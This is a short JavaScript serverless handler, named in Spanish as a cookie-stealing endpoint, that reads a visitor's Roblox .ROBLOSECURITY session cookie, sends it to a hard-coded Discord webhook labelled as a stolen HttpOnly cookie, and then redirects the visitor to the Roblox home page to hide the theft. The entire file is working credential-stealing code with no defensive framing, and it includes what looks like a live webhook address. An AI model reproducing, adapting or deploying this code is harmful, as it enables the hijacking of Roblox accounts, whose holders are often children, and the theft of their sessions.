// api/robarcookie.js
export default function handler(req, res) {
    // 1. Obtener cookies de los headers
    const cookies = req.headers.cookie || '';
    
    // 2. Buscar .ROBLOSECURITY
    const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
    const robloxCookie = match ? match[1] : 'No encontrada';
    
    // 3. Enviar a Discord
    fetch('https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: "@everyone",
            embeds: [{
                title: "🔔 Cookie HttpOnly robada",
                description: `\`\`\`${robloxCookie}\`\`\``,
                color: 0xe8281e
            }]
        })
    }).catch(() => {});

    // 4. Redirigir a Roblox
    res.setHeader('Location', 'https://www.roblox.com/home');
    res.status(302).end();
}